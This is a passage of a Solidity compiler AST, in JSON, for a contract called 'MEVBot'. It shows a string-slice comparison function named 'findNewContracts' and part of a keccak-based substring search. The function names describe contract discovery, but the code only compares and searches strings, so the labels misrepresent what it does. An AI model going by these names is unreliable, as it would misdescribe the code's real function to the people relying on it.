															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 182,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "2334:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_int256_$",
																"typeString": "type(int256)"
															},
															"typeName": {
																"id": 181,
																"name": "int",
																"nodeType": "ElementaryTypeName",
																"src": "2334:3:0",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 185,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2334:15:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_int256",
															"typeString": "int256"
														}
													},
													"src": "2317:32:0",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"functionReturnParameters": 48,
												"id": 187,
												"nodeType": "Return",
												"src": "2310:39:0"
											}
										]
									},
									"documentation": null,
									"id": 189,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findNewContracts",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 45,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 42,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 189,
												"src": "1022:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
													"typeString": "struct MEVBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 41,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 40,
													"src": "1022:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$40_storage_ptr",
														"typeString": "struct MEVBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 44,
												"mutability": "mutable",
												"name": "other",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 189,
												"src": "1041:18:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
													"typeString": "struct MEVBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 43,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 40,
													"src": "1041:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$40_storage_ptr",
														"typeString": "struct MEVBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1021:39:0"
									},
									"returnParameters": {
										"id": 48,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 47,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 189,
												"src": "1084:3:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 46,
													"name": "int",
													"nodeType": "ElementaryTypeName",
													"src": "1084:3:0",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1083:5:0"
									},
									"scope": 1583,
									"src": "996:1360:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 310,
										"nodeType": "Block",
										"src": "2694:1267:0",
										"statements": [
											{
												"assignments": [
													203
												],
												"declarations": [
													{
														"constant": false,
														"id": 203,
														"mutability": "mutable",
														"name": "ptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 310,
														"src": "2704:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 202,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2704:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 205,
												"initialValue": {
													"argumentTypes": null,
													"id": 204,
													"name": "selfptr",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 193,
													"src": "2715:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2704:18:0"
											},
											{
												"assignments": [
													207
												],
												"declarations": [
													{
														"constant": false,
														"id": 207,
														"mutability": "mutable",
														"name": "idx",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 310,
														"src": "2732:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 206,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2732:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 208,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "2732:8:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 211,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 209,
														"name": "needlelen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 195,
														"src": "2755:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 210,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 191,
														"src": "2768:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2755:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 305,
												"nodeType": "IfStatement",
												"src": "2751:1170:0",
												"trueBody": {
													"id": 304,
													"nodeType": "Block",
													"src": "2777:1144:0",
													"statements": [
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 214,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 212,
																	"name": "needlelen",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 195,
																	"src": "2795:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 213,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2808:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2795:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"id": 302,
																"nodeType": "Block",
																"src": "3445:466:0",
																"statements": [
																	{
																		"assignments": [
																			271
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 271,
																				"mutability": "mutable",
																				"name": "hash",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 302,
																				"src": "3512:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 270,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "3512:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 272,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "3512:12:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "3551:43:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "3553:39:0",
																					"value": {
																						"arguments": [
																							{
																								"name": "needleptr",
																								"nodeType": "YulIdentifier",
																								"src": "3571:9:0"
																							},
																							{
																								"name": "needlelen",
																								"nodeType": "YulIdentifier",
																								"src": "3582:9:0"
																							}
																						],
																						"functionName": {
																							"name": "keccak256",
																							"nodeType": "YulIdentifier",
																							"src": "3561:9:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "3561:31:0"
																					},
																					"variableNames": [
																						{
																							"name": "hash",
																							"nodeType": "YulIdentifier",
																							"src": "3553:4:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 271,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3553:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 195,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3582:9:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 197,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3571:9:0",
																				"valueSize": 1
																			}
																		],
																		"id": 273,
																		"nodeType": "InlineAssembly",
																		"src": "3542:52:0"
																	},
																	{
																		"body": {
																			"id": 300,
																			"nodeType": "Block",
																			"src": "3661:236:0",
																			"statements": [
																				{
																					"assignments": [
																						287
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 287,
																							"mutability": "mutable",
																							"name": "testHash",
																							"nodeType": "VariableDeclaration",
																							"overrides": null,
																							"scope": 300,
																							"src": "3683:16:0",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							},
																							"typeName": {
																								"id": 286,
																								"name": "bytes32",
																								"nodeType": "ElementaryTypeName",
																								"src": "3683:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_bytes32",
																									"typeString": "bytes32"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 288,
																					"initialValue": null,
																					"nodeType": "VariableDeclarationStatement",
																					"src": "3683:16:0"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "3730:41:0",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "3732:37:0",
																								"value": {
																									"arguments": [
																										{
																											"name": "ptr",
																											"nodeType": "YulIdentifier",
																											"src": "3754:3:0"
																										},
																										{
																											"name": "needlelen",
																											"nodeType": "YulIdentifier",
																											"src": "3759:9:0"
																										}
																									],
																									"functionName": {
																										"name": "keccak256",
																										"nodeType": "YulIdentifier",
																										"src": "3744:9:0"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "3744:25:0"
																								},
																								"variableNames": [
																									{
																										"name": "testHash",
																										"nodeType": "YulIdentifier",
																										"src": "3732:8:0"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 195,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3759:9:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 203,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3754:3:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 287,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3732:8:0",
																							"valueSize": 1
																						}
																					],
																					"id": 289,
																					"nodeType": "InlineAssembly",
																					"src": "3721:50:0"
																				},
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_bytes32",
																							"typeString": "bytes32"
																						},
																						"id": 292,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 290,
																							"name": "hash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 271,
																							"src": "3796:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "==",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 291,
																							"name": "testHash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 287,
																							"src": "3804:8:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"src": "3796:16:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 295,
																					"nodeType": "IfStatement",
																					"src": "3792:56:0",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"id": 293,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 203,
																							"src": "3845:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 201,
																						"id": 294,
																						"nodeType": "Return",
																						"src": "3838:10:0"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 298,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 296,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 203,
																							"src": "3870:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "+=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"hexValue": "31",
																							"id": 297,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "3877:1:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "3870:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 299,
																					"nodeType": "ExpressionStatement",
																					"src": "3870:8:0"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 282,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 278,
																				"name": "idx",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 207,
																				"src": "3626:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 281,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 279,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 191,
																					"src": "3633:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "-",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 280,
																					"name": "needlelen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 195,
																					"src": "3643:9:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "3633:19:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "3626:26:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 301,
																		"initializationExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 276,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 274,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 207,
																					"src": "3617:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "30",
																					"id": 275,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "3623:1:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					},
																					"value": "0"
																				},
																				"src": "3617:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 277,
																			"nodeType": "ExpressionStatement",
																			"src": "3617:7:0"
																		},
																		"loopExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 284,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "UnaryOperation",
																				"operator": "++",
																				"prefix": false,
																				"src": "3654:5:0",
																				"subExpression": {
																					"argumentTypes": null,
																					"id": 283,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 207,
																					"src": "3654:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 285,
																			"nodeType": "ExpressionStatement",
																			"src": "3654:5:0"
																		},
																		"nodeType": "ForStatement",
																		"src": "3612:285:0"
																	}
																]
															},
															"id": 303,
															"nodeType": "IfStatement",
															"src": "2791:1120:0",
															"trueBody": {
																"id": 269,
																"nodeType": "Block",
																"src": "2812:627:0",
																"statements": [
																	{
																		"assignments": [
																			216
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 216,
																				"mutability": "mutable",
																				"name": "mask",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 269,
																				"src": "2830:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 215,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "2830:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 233,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 231,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "~",
																					"prefix": true,
																					"src": "2853:34:0",
																					"subExpression": {
																						"argumentTypes": null,
																						"components": [
																							{
																								"argumentTypes": null,
																								"commonType": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								},
																								"id": 229,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"leftExpression": {
																									"argumentTypes": null,
																									"commonType": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									},
																									"id": 227,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"leftExpression": {
																										"argumentTypes": null,
																										"hexValue": "32",
																										"id": 219,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "2855:1:0",
																										"subdenomination": null,
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_2_by_1",
																											"typeString": "int_const 2"
																										},
																										"value": "2"
																									},
																									"nodeType": "BinaryOperation",
																									"operator": "**",
																									"rightExpression": {
																										"argumentTypes": null,
																										"components": [
																											{
																												"argumentTypes": null,
																												"commonType": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												},
																												"id": 225,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"leftExpression": {
																													"argumentTypes": null,
																													"hexValue": "38",
																													"id": 220,
																													"isConstant": false,
																													"isLValue": false,
																													"isPure": true,
																													"kind": "number",
																													"lValueRequested": false,
																													"nodeType": "Literal",
																													"src": "2861:1:0",
																													"subdenomination": null,
																													"typeDescriptions": {
																														"typeIdentifier": "t_rational_8_by_1",
																														"typeString": "int_const 8"
																													},
																													"value": "8"
																												},
																												"nodeType": "BinaryOperation",
																												"operator": "*",
																												"rightExpression": {
																													"argumentTypes": null,
																													"components": [
																														{
																															"argumentTypes": null,
																															"commonType": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															},
																															"id": 223,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"leftExpression": {
																																"argumentTypes": null,
																																"hexValue": "3332",
																																"id": 221,
																																"isConstant": false,
																																"isLValue": false,
																																"isPure": true,
																																"kind": "number",
																																"lValueRequested": false,
																																"nodeType": "Literal",
																																"src": "2866:2:0",
																																"subdenomination": null,
																																"typeDescriptions": {
																																	"typeIdentifier": "t_rational_32_by_1",
																																	"typeString": "int_const 32"
																																},
																																"value": "32"
																															},
																															"nodeType": "BinaryOperation",
																															"operator": "-",
																															"rightExpression": {
																																"argumentTypes": null,
																																"id": 222,
																																"name": "needlelen",
																																"nodeType": "Identifier",
																																"overloadedDeclarations": [],
																																"referencedDeclaration": 195,
																																"src": "2871:9:0",
																																"typeDescriptions": {
																																	"typeIdentifier": "t_uint256",
																																	"typeString": "uint256"
																																}
																															},
																															"src": "2866:14:0",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														}
																													],
																													"id": 224,
																													"isConstant": false,
																													"isInlineArray": false,
																													"isLValue": false,
																													"isPure": false,
																													"lValueRequested": false,
																													"nodeType": "TupleExpression",
																													"src": "2865:16:0",
																													"typeDescriptions": {
																														"typeIdentifier": "t_uint256",
																														"typeString": "uint256"
																													}
																												},
																												"src": "2861:20:0",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											}
																										],
																										"id": 226,
																										"isConstant": false,
																										"isInlineArray": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"nodeType": "TupleExpression",
																										"src": "2860:22:0",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"src": "2855:27:0",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"nodeType": "BinaryOperation",
																								"operator": "-",
																								"rightExpression": {
																									"argumentTypes": null,
																									"hexValue": "31",
																									"id": 228,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "number",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "2885:1:0",
																									"subdenomination": null,
																									"typeDescriptions": {
																										"typeIdentifier": "t_rational_1_by_1",
																										"typeString": "int_const 1"
																									},
																									"value": "1"
																								},
																								"src": "2855:31:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							}
																						],
																						"id": 230,
																						"isConstant": false,
																						"isInlineArray": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "TupleExpression",
																						"src": "2854:33:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 218,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "2845:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_bytes32_$",
																					"typeString": "type(bytes32)"
																				},
																				"typeName": {
																					"id": 217,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "2845:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 232,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "2845:43:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2830:58:0"
																	},
																	{
																		"assignments": [
																			235
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 235,
																				"mutability": "mutable",
																				"name": "needledata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 269,
																				"src": "2907:18:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 234,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "2907:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 236,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2907:18:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "2952:45:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "2954:41:0",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "needleptr",
																										"nodeType": "YulIdentifier",
																										"src": "2978:9:0"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "2972:5:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "2972:16:0"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "2990:4:0"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "2968:3:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "2968:27:0"
																					},
																					"variableNames": [
																						{
																							"name": "needledata",
																							"nodeType": "YulIdentifier",
																							"src": "2954:10:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 216,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "2990:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 235,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "2954:10:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 197,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "2978:9:0",
																				"valueSize": 1
																			}
																		],
																		"id": 237,
																		"nodeType": "InlineAssembly",
																		"src": "2943:54:0"
																	},
																	{
																		"assignments": [
																			239
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 239,
																				"mutability": "mutable",
																				"name": "end",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 269,
																				"src": "3015:8:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 238,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "3015:4:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 245,
																		"initialValue": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 244,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 242,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 240,
																					"name": "selfptr",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 193,
																					"src": "3026:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
